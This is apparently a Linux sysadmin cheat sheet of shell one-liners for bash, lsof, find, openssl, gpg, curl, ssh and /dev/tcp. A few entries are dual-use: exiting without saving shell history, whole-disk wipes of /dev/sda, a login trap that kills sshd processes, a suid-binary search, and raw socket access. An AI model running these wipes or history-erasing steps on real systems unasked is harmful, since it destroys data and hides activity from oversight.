###### Reload shell without exit

```bash
exec $SHELL -l
```

###### Close shell keeping all subprocess running

```bash
disown -a && exit
```

###### Exit without saving shell history

```bash
kill -9 $$
unset HISTFILE && exit
```

###### Perform a branching conditional

```bash
true && echo success
false || echo failed
```

###### Pipe stdout and stderr to separate commands

```bash
some_command > >(/bin/cmd_for_stdout) 2> >(/bin/cmd_for_stderr)
```

###### Redirect stdout and stderr each to separate files and print both to the screen

```bash
(some_command 2>&1 1>&3 | tee errorlog ) 3>&1 1>&2 | tee stdoutlog
```

###### List of commands you use most often

```bash
history | \
awk '{CMD[$2]++;count++;}END { for (a in CMD)print CMD[a] " " CMD[a]/count*100 "% " a;}' | \
grep -v "./" | \
column -c3 -s " " -t | \
sort -nr | nl |  head -n 20
```

###### Sterilize bash history

```bash
function sterile() {

  history | awk '$2 != "history" { $1=""; print $0 }' | egrep -vi "\
curl\b+.*(-E|--cert)\b+.*\b*|\
curl\b+.*--pass\b+.*\b*|\
curl\b+.*(-U|--proxy-user).*:.*\b*|\
curl\b+.*(-u|--user).*:.*\b*
.*(-H|--header).*(token|auth.*)\b+.*|\
wget\b+.*--.*password\b+.*\b*|\
http.?://.+:.+@.*\
" > $HOME/histbuff; history -r $HOME/histbuff;

}

export PROMPT_COMMAND="sterile"
```

  > Look also: [A naive utility to censor credentials in command history](https://github.com/lbonanomi/go/blob/master/revisionist.go).

###### Quickly backup a file

```bash
cp filename{,.orig}
```

###### Empty a file (truncate to 0 size)

```bash
>filename
```

###### Delete all files in a folder that don't match a certain file extension

```bash
rm !(*.foo|*.bar|*.baz)
```

###### Pass multi-line string to a file

```bash
# cat  >filename ... - overwrite the file
# cat >>filename ... - append to a file
cat > filename << __EOF__
data data data
__EOF__
```

###### Edit a file on a remote host using vim

```bash
vim scp://user@host//etc/fstab
```

###### Create a directory and change into it at the same time

```bash
mkd() { mkdir -p "$@" && cd "$@"; }
```

###### Convert uppercase files to lowercase files

```bash
rename 'y/A-Z/a-z/' *
```

###### Print a row of characters across the terminal

```bash
printf "%`tput cols`s" | tr ' ' '#'
```

###### Show shell history without line numbers

```bash
history | cut -c 8-
fc -l -n 1 | sed 's/^\s*//'
```

###### Run command(s) after exit session

```bash
cat > /etc/profile << __EOF__
_after_logout() {

  username=$(whoami)

  for _pid in $(ps afx | grep sshd | grep "$username" | awk '{print $1}') ; do

    kill -9 $_pid

  done

}
trap _after_logout EXIT
__EOF__
```

###### Generate a sequence of numbers

```bash
for ((i=1; i<=10; i+=2)) ; do echo $i ; done
# alternative: seq 1 2 10

for ((i=5; i<=10; ++i)) ; do printf '%02d\n' $i ; done
# alternative: seq -w 5 10

for i in {1..10} ; do echo $i ; done
```

###### Simple Bash filewatching

```bash
unset MAIL; export MAILCHECK=1; export MAILPATH='$FILE_TO_WATCH?$MESSAGE'
```

---

##### Tool: [busybox](https://www.busybox.net/)

###### Static HTTP web server

```bash
busybox httpd -p $PORT -h $HOME [-c httpd.conf]
```

___

##### Tool: [mount](https://en.wikipedia.org/wiki/Mount_(Unix))

###### Mount a temporary ram partition

```bash
mount -t tmpfs tmpfs /mnt -o size=64M
```

  * `-t` - filesystem type
  * `-o` - mount options

###### Remount a filesystem as read/write

```bash
mount -o remount,rw /
```

___

##### Tool: [fuser](https://en.wikipedia.org/wiki/Fuser_(Unix))

###### Show which processes use the files/directories

```bash
fuser /var/log/daemon.log
fuser -v /home/supervisor
```

###### Kills a process that is locking a file

```bash
fuser -ki filename
```

  * `-i` - interactive option

###### Kills a process that is locking a file with specific signal

```bash
fuser -k -HUP filename
```

  * `--list-signals` - list available signal names

###### Show what PID is listening on specific port

```bash
fuser -v 53/udp
```

###### Show all processes using the named filesystems or block device

```bash
fuser -mv /var/www
```

___

##### Tool: [lsof](https://en.wikipedia.org/wiki/Lsof)

###### Show process that use internet connection at the moment

```bash
lsof -P -i -n
```

###### Show process that use specific port number

```bash
lsof -i tcp:443
```

###### Lists all listening ports together with the PID of the associated process

```bash
lsof -Pan -i tcp -i udp
```

###### List all open ports and their owning executables

```bash
lsof -i -P | grep -i "listen"
```

###### Show all open ports

```bash
lsof -Pnl -i
```

###### Show open ports (LISTEN)

```bash
lsof -Pni4 | grep LISTEN | column -t
```

###### List all files opened by a particular command

```bash
lsof -c "process"
```

###### View user activity per directory

```bash
lsof -u username -a +D /etc
```

###### Show 10 largest open files

```bash
lsof / | \
awk '{ if($7 > 1048576) print $7/1048576 "MB" " " $9 " " $1 }' | \
sort -n -u | tail | column -t
```

###### Show current working directory of a process

```bash
lsof -p <PID> | grep cwd
```

___

##### Tool: [ps](https://en.wikipedia.org/wiki/Ps_(Unix))

###### Show a 4-way scrollable process tree with full details

```bash
ps awwfux | less -S
```

###### Processes per user counter

```bash
ps hax -o user | sort | uniq -c | sort -r
```

###### Show all processes by name with main header

```bash
ps -lfC nginx
```

___

##### Tool: [find](https://en.wikipedia.org/wiki/Find_(Unix))

###### Find files that have been modified on your system in the past 60 minutes

```bash
find / -mmin 60 -type f
```

###### Find all files larger than 20M

```bash
find / -type f -size +20M
```

###### Find duplicate files (based on MD5 hash)

```bash
find -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 33
```

###### Change permission only for files

```bash
cd /var/www/site && find . -type f -exec chmod 766 {} \;
cd /var/www/site && find . -type f -exec chmod 664 {} +
```

###### Change permission only for directories

```bash
cd /var/www/site && find . -type d -exec chmod g+x {} \;
cd /var/www/site && find . -type d -exec chmod g+rwx {} +
```

###### Find files and directories for specific user/group

```bash
# User:
find . -user <username> -print
find /etc -type f -user <username> -name "*.conf"

# Group:
find /opt -group <group>
find /etc -type f -group <group> -iname "*.conf"
```

###### Find files and directories for all without specific user/group

```bash
# User:
find . \! -user <username> -print

# Group:
find . \! -group <group>
```

###### Looking for files/directories that only have certain permission

```bash
# User
find . -user <username> -perm -u+rw # -rw-r--r--
find /home -user $(whoami) -perm 777 # -rwxrwxrwx

# Group:
find /home -type d -group <group> -perm 755 # -rwxr-xr-x
```

###### Delete older files than 60 days

```bash
find . -type f -mtime +60 -delete
```

###### Recursively remove all empty sub-directories from a directory

```bash
find . -depth  -type d  -empty -exec rmdir {} \;
```

###### How to find all hard links to a file

```bash
find </path/to/dir> -xdev -samefile filename
```

###### Recursively find the latest modified files

```bash
find . -type f -exec stat --format '%Y :%y %n' "{}" \; | sort -nr | cut -d: -f2- | head
```

###### Recursively find/replace of a string with sed

```bash
find . -not -path '*/\.git*' -type f -print0 | xargs -0 sed -i 's/foo/bar/g'
```

###### Recursively find/replace of a string in directories and file names

```bash
find . -depth -name '*test*' -execdir bash -c 'mv -v "$1" "${1//foo/bar}"' _ {} \;
```

###### Recursively find suid executables

```bash
find / \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \;
```

___

##### Tool: [top](https://en.wikipedia.org/wiki/Top_(software))

###### Use top to monitor only all processes with the specific string

```bash
top -p $(pgrep -d , <str>)
```

  * `<str>` - process containing string (eg. nginx, worker)

___

##### Tool: [vmstat](https://en.wikipedia.org/wiki/Vmstat)

###### Show current system utilization (fields in kilobytes)

```bash
vmstat 2 20 -t -w
```

  * `2` - number of times with a defined time interval (delay)
  * `20` - each execution of the command (count)
  * `-t` - show timestamp
  * `-w` - wide output
  * `-S M` - output of the fields in megabytes instead of kilobytes

###### Show current system utilization will get refreshed every 5 seconds

```bash
vmstat 5 -w
```

###### Display report a summary of disk operations

```bash
vmstat -D
```

###### Display report of event counters and memory stats

```bash
vmstat -s
```

###### Display report about kernel objects stored in slab layer cache

```bash
vmstat -m
```

##### Tool: [iostat](https://en.wikipedia.org/wiki/Iostat)

###### Show information about the CPU usage, and I/O statistics about all the partitions

```bash
iostat 2 10 -t -m
```

  * `2` - number of times with a defined time interval (delay)
  * `10` - each execution of the command (count)
  * `-t` - show timestamp
  * `-m` - fields in megabytes (`-k` - in kilobytes, default)

###### Show information only about the CPU utilization

```bash
iostat 2 10 -t -m -c
```

###### Show information only about the disk utilization

```bash
iostat 2 10 -t -m -d
```

###### Show information only about the LVM utilization

```bash
iostat -N
```

___

##### Tool: [strace](https://en.wikipedia.org/wiki/Strace)

###### Track with child processes

```bash
# 1)
strace -f -p $(pidof glusterfsd)

# 2)
strace -f $(pidof php-fpm | sed 's/\([0-9]*\)/\-p \1/g')
```

###### Track process with 30 seconds limit

```bash
timeout 30 strace $(< /var/run/zabbix/zabbix_agentd.pid)
```

###### Track processes and redirect output to a file

```bash
ps auxw | grep '[a]pache' | awk '{print " -p " $2}' | \
xargs strace -o /tmp/strace-apache-proc.out
```

###### Track with print time spent in each syscall and limit length of print strings

```bash
ps auxw | grep '[i]init_policy' | awk '{print " -p " $2}' | \
xargs strace -f -e trace=network -T -s 10000
```

###### Track the open request of a network port

```bash
strace -f -e trace=bind nc -l 80
```

###### Track the open request of a network port (show TCP/UDP)

```bash
strace -f -e trace=network nc -lu 80
```

___

##### Tool: [kill](https://en.wikipedia.org/wiki/Kill_(command))

###### Kill a process running on port

```bash
kill -9 $(lsof -i :<port> | awk '{l=$2} END {print l}')
```

___

##### Tool: [diff](https://en.wikipedia.org/wiki/Diff)

###### Compare two directory trees

```bash
diff <(cd directory1 && find | sort) <(cd directory2 && find | sort)
```

###### Compare output of two commands

```bash
diff <(cat /etc/passwd) <(cut -f2 /etc/passwd)
```

___

##### Tool: [vimdiff](http://vimdoc.sourceforge.net/htmldoc/diff.html)

###### Highlight the exact differences, based on characters and words

```bash
vimdiff file1 file2
```

###### Compare two JSON files

```bash
vimdiff <(jq -S . A.json) <(jq -S . B.json)
```

###### Compare Hex dump

```bash
d(){ vimdiff <(f $1) <(f $2);};f(){ hexdump -C $1 | cut -d' ' -f3- | tr -s ' ';}; d ~/bin1 ~/bin2
```

###### diffchar

Save [diffchar](https://raw.githubusercontent.com/vim-scripts/diffchar.vim/master/plugin/diffchar.vim) @ `~/.vim/plugins`

Click `F7` to switch between diff modes

Usefull `vimdiff` commands:

* `qa` to exit all windows
* `:vertical resize 70` to resize window
* set window width `Ctrl+W [N columns]+(Shift+)<\>`

___

##### Tool: [tail](https://en.wikipedia.org/wiki/Tail_(Unix))

###### Annotate tail -f with timestamps

```bash
tail -f file | while read ; do echo "$(date +%T.%N) $REPLY" ; done
```

###### Analyse an Apache access log for the most common IP addresses

```bash
tail -10000 access_log | awk '{print $1}' | sort | uniq -c | sort -n | tail
```

###### Analyse web server log and show only 5xx http codes

```bash
tail -n 100 -f /path/to/logfile | grep "HTTP/[1-2].[0-1]\" [5]"
```

___

##### Tool: [tar](https://en.wikipedia.org/wiki/Tar_(computing))

###### System backup with exclude specific directories

```bash
cd /
tar -czvpf /mnt/system$(date +%d%m%Y%s).tgz --directory=/ \
--exclude=proc/* --exclude=sys/* --exclude=dev/* --exclude=mnt/* .
```

###### System backup with exclude specific directories (pigz)

```bash
cd /
tar cvpf /backup/snapshot-$(date +%d%m%Y%s).tgz --directory=/ \
--exclude=proc/* --exclude=sys/* --exclude=dev/* \
--exclude=mnt/* --exclude=tmp/* --use-compress-program=pigz .
```

___

##### Tool: [dump](https://en.wikipedia.org/wiki/Dump_(program))

###### System backup to file

```bash
dump -y -u -f /backup/system$(date +%d%m%Y%s).lzo /
```

###### Restore system from lzo file

```bash
cd /
restore -rf /backup/system$(date +%d%m%Y%s).lzo
```

___

##### Tool: [cpulimit](http://cpulimit.sourceforge.net/)

###### Limit the cpu usage of a process

```bash
cpulimit -p pid -l 50
```

___

##### Tool: [pwdx](https://www.cyberciti.biz/faq/unix-linux-pwdx-command-examples-usage-syntax/)

###### Show current working directory of a process

```bash
pwdx <pid>
```

___

##### Tool: [taskset](https://www.cyberciti.biz/faq/taskset-cpu-affinity-command/)

###### Start a command on only one CPU core

```bash
taskset -c 0 <command>
```

___

##### Tool: [tr](https://en.wikipedia.org/wiki/Tr_(Unix))

###### Show directories in the PATH, one per line

```bash
tr : '\n' <<<$PATH
```

___

##### Tool: [chmod](https://en.wikipedia.org/wiki/Chmod)

###### Remove executable bit from all files in the current directory

```bash
chmod -R -x+X *
```

###### Restore permission for /bin/chmod

```bash
# 1:
cp /bin/ls chmod.01
cp /bin/chmod chmod.01
./chmod.01 700 file

# 2:
/bin/busybox chmod 0700 /bin/chmod

# 3:
setfacl --set u::rwx,g::---,o::--- /bin/chmod
```

___

##### Tool: [who](https://en.wikipedia.org/wiki/Who_(Unix))

###### Find last reboot time

```bash
who -b
```

###### Detect a user sudo-su'd into the current shell

```bash
[[ $(who -m | awk '{ print $1 }') == $(whoami) ]] || echo "You are su-ed to $(whoami)"
```

___

##### Tool: [last](https://www.howtoforge.com/linux-last-command/)

###### Was the last reboot a panic?

```bash
(last -x -f $(ls -1t /var/log/wtmp* | head -2 | tail -1); last -x -f /var/log/wtmp) | \
grep -A1 reboot | head -2 | grep -q shutdown && echo "Expected reboot" || echo "Panic reboot"
```

___

##### Tool: [screen](https://en.wikipedia.org/wiki/GNU_Screen)

###### Start screen in detached mode

```bash
screen -d -m <command>
```

###### Attach to an existing screen session

```bash
screen -r -d <pid>
```

___

##### Tool: [script](https://en.wikipedia.org/wiki/Script_(Unix))

###### Record and replay terminal session

```bash
### Record session
# 1)
script -t 2>~/session.time -a ~/session.log

# 2)
script --timing=session.time session.log

### Replay session
scriptreplay --timing=session.time session.log
```

___

##### Tool: [du](https://en.wikipedia.org/wiki/GNU_Screen)

###### Show 20 biggest directories with 'K M G'

```bash
du | \
sort -r -n | \
awk '{split("K M G",v); s=1; while($1>1024){$1/=1024; s++} print int($1)" "v[s]"\t"$2}' | \
head -n 20
```

___

##### Tool: [inotifywait](https://en.wikipedia.org/wiki/GNU_Screen)

###### Init tool everytime a file in a directory is modified

```bash
while true ; do inotifywait -r -e MODIFY dir/ && ls dir/ ; done;
```

___

##### Tool: [openssl](https://www.openssl.org/)

###### Testing connection to the remote host

```bash
echo | openssl s_client -connect google.com:443 -showcerts
```

###### Testing connection to the remote host (debug mode)

```bash
echo | openssl s_client -connect google.com:443 -showcerts -tlsextdebug -status
```

###### Testing connection to the remote host (with SNI support)

```bash
echo | openssl s_client -showcerts -servername google.com -connect google.com:443
```

###### Testing connection to the remote host with specific ssl version

```bash
openssl s_client -tls1_2 -connect google.com:443
```

###### Testing connection to the remote host with specific ssl cipher

```bash
openssl s_client -cipher 'AES128-SHA' -connect google.com:443
```

###### Verify 0-RTT

```bash
_host="example.com"

cat > req.in << __EOF__
HEAD / HTTP/1.1
Host: $_host
Connection: close
__EOF__

openssl s_client -connect ${_host}:443 -tls1_3 -sess_out session.pem -ign_eof < req.in
openssl s_client -connect ${_host}:443 -tls1_3 -sess_in session.pem -early_data req.in
```

###### Generate private key without passphrase

```bash
# _len: 2048, 4096
( _fd="private.key" ; _len="2048" ; \
openssl genrsa -out ${_fd} ${_len} )
```

###### Generate private key with passphrase

```bash
# _ciph: aes128, aes256
# _len: 2048, 4096
( _ciph="aes128" ; _fd="private.key" ; _len="2048" ; \
openssl genrsa -${_ciph} -out ${_fd} ${_len} )
```

###### Remove passphrase from private key

```bash
( _fd="private.key" ; _fd_unp="private_unp.key" ; \
openssl rsa -in ${_fd} -out ${_fd_unp} )
```

###### Encrypt existing private key with a passphrase

```bash
# _ciph: aes128, aes256
( _ciph="aes128" ; _fd="private.key" ; _fd_pass="private_pass.key" ; \
openssl rsa -${_ciph} -in ${_fd} -out ${_fd_pass}
```

###### Check private key

```bash
( _fd="private.key" ; \
openssl rsa -check -in ${_fd} )
```

###### Get public key from private key

```bash
( _fd="private.key" ; _fd_pub="public.key" ; \
openssl rsa -pubout -in ${_fd} -out ${_fd_pub} )
```

###### Generate private key and CSR

```bash
( _fd="private.key" ; _fd_csr="request.csr" ; _len="2048" ; \
openssl req -out ${_fd_csr} -new -newkey rsa:${_len} -nodes -keyout ${_fd} )
```

###### Generate CSR

```bash
( _fd="private.key" ; _fd_csr="request.csr" ; \
openssl req -out ${_fd_csr} -new -key ${_fd} )
```

###### Generate CSR (metadata from existing certificate)

  > Where `private.key` is the existing private key. As you can see you do not generate this CSR from your certificate (public key). Also you do not generate the "same" CSR, just a new one to request a new certificate.

```bash
( _fd="private.key" ; _fd_csr="request.csr" ; _fd_crt="cert.crt" ; \
openssl x509 -x509toreq -in ${_fd_crt} -out ${_fd_csr} -signkey ${_fd} )
```

###### Generate CSR with -config param

```bash
( _fd="private.key" ; _fd_csr="request.csr" ; \
openssl req -new -sha256 -key ${_fd} -out ${_fd_csr} \
-config <(
cat << __EOF__
[req]
default_bits        = 2048
default_md          = sha256
prompt              = no
distinguished_name  = dn
req_extensions      = req_ext

[ dn ]
C   = "<two-letter ISO abbreviation for your country>"
ST  = "<state or province where your organisation is legally located>"
L   = "<city where your organisation is legally located>"
O   = "<legal name of your organisation>"
OU  = "<section of the organisation>"
CN  = "<fully qualified domain name>"

[ req_ext ]
subjectAltName = @alt_names

[ alt_names ]
DNS.1 = <fully qualified domain name>
DNS.2 = <next domain>
DNS.3 = <next domain>
__EOF__
))
```

Other values in `[ dn ]`:

```
countryName            = "DE"                     # C=
stateOrProvinceName    = "Hessen"                 # ST=
localityName           = "Keller"                 # L=
postalCode             = "424242"                 # L/postalcode=
postalAddress          = "Keller"                 # L/postaladdress=
streetAddress          = "Crater 1621"            # L/street=
organizationName       = "apfelboymschule"        # O=
organizationalUnitName = "IT Department"          # OU=
commonName             = "example.com"            # CN=
emailAddress           = "webmaster@example.com"  # CN/emailAddress=
```

Example of `oids` (you'll probably also have to make OpenSSL know about the new fields required for EV by adding the following under `[new_oids]`):

```
[req]
...
oid_section         = new_oids

[ new_oids ]
postalCode = 2.5.4.17
streetAddress = 2.5.4.9
```

Full example:

```bash
( _fd="private.key" ; _fd_csr="request.csr" ; \
openssl req -new -sha256 -key ${_fd} -out ${_fd_csr} \
-config <(
cat << __EOF__
[req]
default_bits        = 2048
default_md          = sha256
prompt              = no
distinguished_name  = dn
req_extensions      = req_ext
oid_section         = new_oids

[ new_oids ]
serialNumber = 2.5.4.5
streetAddress = 2.5.4.9
postalCode = 2.5.4.17
businessCategory = 2.5.4.15

[ dn ]
serialNumber=00001111
businessCategory=Private Organization
jurisdictionC=DE
C=DE
ST=Hessen
L=Keller
postalCode=424242
streetAddress=Crater 1621
O=AV Company
OU=IT
CN=example.com

[ req_ext ]
subjectAltName = @alt_names

[ alt_names ]
DNS.1 = example.com
__EOF__
))
```

For more information please look at these great explanations:

- [RFC 5280](https://tools.ietf.org/html/rfc5280)
- [How to create multidomain certificates using config files](https://apfelboymchen.net/gnu/notes/openssl%20multidomain%20with%20config%20files.html)
- [Generate a multi domains certificate using config files](https://gist.github.com/romainnorberg/464758a6620228b977212a3cf20c3e08)
- [Your OpenSSL CSR command is out of date](https://expeditedsecurity.com/blog/openssl-csr-command/)
- [OpenSSL example configuration file](https://www.tbs-certificats.com/openssl-dem-server-cert.cnf)
- [Object Identifiers (OIDs)](https://www.alvestrand.no/objectid/)
- [openssl objects.txt](https://github.com/openssl/openssl/blob/master/crypto/objects/objects.txt)

###### List available EC curves

```bash
openssl ecparam -list_curves
```

###### Print ECDSA private and public keys

```bash
( _fd="private.key" ; \
openssl ec -in ${_fd} -noout -text )

# For x25519 only extracting public key
( _fd="private.key" ; _fd_pub="public.key" ; \
openssl pkey -in ${_fd} -pubout -out ${_fd_pub} )
```

###### Generate ECDSA private key

```bash
# _curve: prime256v1, secp521r1, secp384r1
( _fd="private.key" ; _curve="prime256v1" ; \
openssl ecparam -out ${_fd} -name ${_curve} -genkey )

# _curve: X25519
( _fd="private.key" ; _curve="x25519" ; \
openssl genpkey -algorithm ${_curve} -out ${_fd} )
```

###### Generate private key and CSR (ECC)

```bash
# _curve: prime256v1, secp521r1, secp384r1
( _fd="domain.com.key" ; _fd_csr="domain.com.csr" ; _curve="prime256v1" ; \
openssl ecparam -out ${_fd} -name ${_curve} -genkey ; \
openssl req -new -key ${_fd} -out ${_fd_csr} -sha256 )
```

###### Generate self-signed certificate

```bash
# _len: 2048, 4096
( _fd="domain.key" ; _fd_out="domain.crt" ; _len="2048" ; _days="365" ; \
openssl req -newkey rsa:${_len} -nodes \
-keyout ${_fd} -x509 -days ${_days} -out ${_fd_out} )
```

###### Generate self-signed certificate from existing private key

```bash
# _len: 2048, 4096
( _fd="domain.key" ; _fd_out="domain.crt" ; _days="365" ; \
openssl req -key ${_fd} -nodes \
-x509 -days ${_days} -out ${_fd_out} )
```

###### Generate self-signed certificate from existing private key and csr

```bash
# _len: 2048, 4096
( _fd="domain.key" ; _fd_csr="domain.csr" ; _fd_out="domain.crt" ; _days="365" ; \
openssl x509 -signkey ${_fd} -nodes \
-in ${_fd_csr} -req -days ${_days} -out ${_fd_out} )
```

###### Generate DH public parameters

```bash
( _dh_size="2048" ; \
openssl dhparam -out /etc/nginx/ssl/dhparam_${_dh_size}.pem "$_dh_size" )
```

###### Display DH public parameters

```bash
openssl pkeyparam -in dhparam.pem -text
```

###### Extract private key from pfx

```bash
( _fd_pfx="cert.pfx" ; _fd_key="key.pem" ; \
openssl pkcs12 -in ${_fd_pfx} -nocerts -nodes -out ${_fd_key} )
```

###### Extract private key and certs from pfx

```bash
( _fd_pfx="cert.pfx" ; _fd_pem="key_certs.pem" ; \
openssl pkcs12 -in ${_fd_pfx} -nodes -out ${_fd_pem} )
```

###### Extract certs from p7b

```bash
# PKCS#7 file doesn't include private keys.
( _fd_p7b="cert.p7b" ; _fd_pem="cert.pem" ; \
openssl pkcs7 -inform DER -outform PEM -in ${_fd_p7b} -print_certs > ${_fd_pem})
# or:
openssl pkcs7 -print_certs -in -in ${_fd_p7b} -out ${_fd_pem})
```

###### Convert DER to PEM

```bash
( _fd_der="cert.crt" ; _fd_pem="cert.pem" ; \
openssl x509 -in ${_fd_der} -inform der -outform pem -out ${_fd_pem} )
```

###### Convert PEM to DER

```bash
( _fd_der="cert.crt" ; _fd_pem="cert.pem" ; \
openssl x509 -in ${_fd_pem} -outform der -out ${_fd_der} )
```

###### Verification of the private key

```bash
( _fd="private.key" ; \
openssl rsa -noout -text -in ${_fd} )
```

###### Verification of the public key

```bash
# 1)
( _fd="public.key" ; \
openssl pkey -noout -text -pubin -in ${_fd} )

# 2)
( _fd="private.key" ; \
openssl rsa -inform PEM -noout -in ${_fd} &> /dev/null ; \
if [ $? = 0 ] ; then echo -en "OK\n" ; fi )
```

###### Verification of the certificate

```bash
( _fd="certificate.crt" ; # format: pem, cer, crt \
openssl x509 -noout -text -in ${_fd} )
```

###### Verification of the CSR

```bash
( _fd_csr="request.csr" ; \
openssl req -text -noout -in ${_fd_csr} )
```

###### Check the private key and the certificate are match

```bash
(openssl rsa -noout -modulus -in private.key | openssl md5 ; \
openssl x509 -noout -modulus -in certificate.crt | openssl md5) | uniq
```

###### Check the private key and the CSR are match

```bash
(openssl rsa -noout -modulus -in private.key | openssl md5 ; \
openssl req -noout -modulus -in request.csr | openssl md5) | uniq
```

___

##### Tool: [secure-delete](https://wiki.archlinux.org/index.php/Securely_wipe_disk)

###### Secure delete with shred

```bash
shred -vfuz -n 10 file
shred --verbose --random-source=/dev/urandom -n 1 /dev/sda
```

###### Secure delete with scrub

```bash
scrub -p dod /dev/sda
scrub -p dod -r file
```

###### Secure delete with badblocks

```bash
badblocks -s -w -t random -v /dev/sda
badblocks -c 10240 -s -w -t random -v /dev/sda
```

###### Secure delete with secure-delete

```bash
srm -vz /tmp/file
sfill -vz /local
sdmem -v
swapoff /dev/sda5 && sswap -vz /dev/sda5
```

___

##### Tool: [dd](https://en.wikipedia.org/wiki/Dd_(Unix))

###### Show dd status every so often

```bash
dd <dd_params> status=progress
watch --interval 5 killall -USR1 dd
```

###### Redirect output to a file with dd

```bash
echo "string" | dd of=filename
```

___

##### Tool: [gpg](https://www.gnupg.org/)

###### Export public key

```bash
gpg --export --armor "<username>" > username.pkey
```

  * `--export` - export all keys from all keyrings or specific key
  * `-a|--armor` - create ASCII armored output

###### Encrypt file

```bash
gpg -e -r "<username>" dump.sql
```

  * `-e|--encrypt` - encrypt data
  * `-r|--recipient` - encrypt for specific <username>

###### Decrypt file

```bash
gpg -o dump.sql -d dump.sql.gpg
```

  * `-o|--output` - use as output file
  * `-d|--decrypt` - decrypt data (default)

###### Search recipient

```bash
gpg --keyserver hkp://keyserver.ubuntu.com --search-keys "<username>"
```

  * `--keyserver` - set specific key server
  * `--search-keys` - search for keys on a key server

###### List all of the packets in an encrypted file

```bash
gpg --batch --list-packets archive.gpg
gpg2 --batch --list-packets archive.gpg
```

___

##### Tool: [system-other](https://github.com/trimstray/the-book-of-secret-knowledge#tool-system-other)

###### Reboot system from init

```bash
exec /sbin/init 6
```

###### Init system from single user mode

```bash
exec /sbin/init
```

###### Show current working directory of a process

```bash
readlink -f /proc/<PID>/cwd
```

###### Show actual pathname of the executed command

```bash
readlink -f /proc/<PID>/exe
```

##### Tool: [curl](https://curl.haxx.se)

```bash
curl -Iks https://www.google.com
```

  * `-I` - show response headers only
  * `-k` - insecure connection when using ssl
  * `-s` - silent mode (not display body)

```bash
curl -Iks --location -X GET -A "x-agent" https://www.google.com
```

  * `--location` - follow redirects
  * `-X` - set method
  * `-A` - set user-agent

```bash
curl -Iks --location -X GET -A "x-agent" --proxy http://127.0.0.1:16379 https://www.google.com
```

  * `--proxy [socks5://|http://]` - set proxy server

```bash
curl -o file.pdf -C - https://example.com/Aiju2goo0Ja2.pdf
```

  * `-o` - write output to file
  * `-C` - resume the transfer

###### Find your external IP address (external services)

```bash
curl ipinfo.io
curl ipinfo.io/ip
curl icanhazip.com
curl ifconfig.me/ip ; echo
```

###### Repeat URL request

```bash
# URL sequence substitution with a dummy query string:
curl -ks https://example.com/?[1-20]

# With shell 'for' loop:
for i in {1..20} ; do curl -ks https://example.com/ ; done
```

###### Check DNS and HTTP trace with headers for specific domains

```bash
### Set domains and external dns servers.
_domain_list=(google.com) ; _dns_list=("8.8.8.8" "1.1.1.1")

for _domain in "${_domain_list[@]}" ; do

  printf '=%.0s' {1..48}

  echo

  printf "[\\e[1;32m+\\e[m] resolve: %s\\n" "$_domain"

  for _dns in "${_dns_list[@]}" ; do

    # Resolve domain.
    host "${_domain}" "${_dns}"

    echo

  done

  for _proto in http https ; do

    printf "[\\e[1;32m+\\e[m] trace + headers: %s://%s\\n" "$_proto" "$_domain"

    # Get trace and http headers.
    curl -Iks -A "x-agent" --location "${_proto}://${_domain}"

    echo

  done

done

unset _domain_list _dns_list
```

___

##### Tool: [httpie](https://httpie.org/)

```bash
http -p Hh https://www.google.com
```

  * `-p` - print request and response headers
    * `H` - request headers
    * `B` - request body
    * `h` - response headers
    * `b` - response body

```bash
http -p Hh https://www.google.com --follow --verify no
```

  * `-F, --follow` - follow redirects
  * `--verify no` - skip SSL verification

```bash
http -p Hh https://www.google.com --follow --verify no \
--proxy http:http://127.0.0.1:16379
```

  * `--proxy [http:]` - set proxy server

##### Tool: [ssh](https://www.openssh.com/)

###### Escape Sequence

```
# Supported escape sequences:
~.  - terminate connection (and any multiplexed sessions)
~B  - send a BREAK to the remote system
~C  - open a command line
~R  - Request rekey (SSH protocol 2 only)
~^Z - suspend ssh
~#  - list forwarded connections
~&  - background ssh (when waiting for connections to terminate)
~?  - this message
~~  - send the escape character by typing it twice
```

###### Compare a remote file with a local file

```bash
ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
```

###### SSH connection through host in the middle

```bash
ssh -t reachable_host ssh unreachable_host
```

###### Run command over SSH on remote host

```bash
cat > cmd.txt << __EOF__
cat /etc/hosts
__EOF__

ssh host -l user $(<cmd.txt)
```

###### Get public key from private key

```bash
ssh-keygen -y -f ~/.ssh/id_rsa
```

###### Get all fingerprints

```bash
ssh-keygen -l -f .ssh/known_hosts
```

###### SSH authentication with user password

```bash
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no user@remote_host
```

###### SSH authentication with publickey

```bash
ssh -o PreferredAuthentications=publickey -o PubkeyAuthentication=yes -i id_rsa user@remote_host
```

###### Simple recording SSH session

```bash
function _ssh_sesslog() {

  _sesdir="<path/to/session/logs>"

  mkdir -p "${_sesdir}" && \
  ssh $@ 2>&1 | tee -a "${_sesdir}/$(date +%Y%m%d).log"

}

# Alias:
alias ssh='_ssh_sesslog'
```

###### Using Keychain for SSH logins

```bash
### Delete all of ssh-agent's keys.
function _scl() {

  /usr/bin/keychain --clear

}

### Add key to keychain.
function _scg() {

  /usr/bin/keychain /path/to/private-key
  source "$HOME/.keychain/$HOSTNAME-sh"

}
```

###### SSH login without processing any login scripts

```bash
ssh -tt user@host bash
```

###### SSH local port forwarding

Example 1:

```bash
# Forwarding our local 2250 port to nmap.org:443 from localhost through localhost
host1> ssh -L 2250:nmap.org:443 localhost

# Connect to the service:
host1> curl -Iks --location -X GET https://localhost:2250
```

Example 2:

```bash
# Forwarding our local 9051 port to db.d.x:5432 from localhost through node.d.y
host1> ssh -nNT -L 9051:db.d.x:5432 node.d.y

# Connect to the service:
host1> psql -U db_user -d db_dev -p 9051 -h localhost
```

  * `-n` - redirects stdin from `/dev/null`
  * `-N` - do not execute a remote command
  * `-T` - disable pseudo-terminal allocation

###### SSH remote port forwarding

```bash
# Forwarding our local 9051 port to db.d.x:5432 from host2 through node.d.y
host1> ssh -nNT -R 9051:db.d.x:5432 node.d.y

# Connect to the service:
host2> psql -U postgres -d postgres -p 8000 -h localhost
```

___

##### Tool: [linux-dev](https://www.tldp.org/LDP/abs/html/devref1.html)

###### Testing remote connection to port

```bash
timeout 1 bash -c "</dev/<proto>/<host>/<port>" >/dev/null 2>&1 ; echo $?
```

  * `<proto` - set protocol (tcp/udp)
  * `<host>` - set remote host
  * `<port>` - set destination port

###### Read and write to TCP or UDP sockets with common bash tools

```bash
exec 5<>/dev/tcp/<host>/<port>; cat <&5 & cat >&5; exec 5>&-
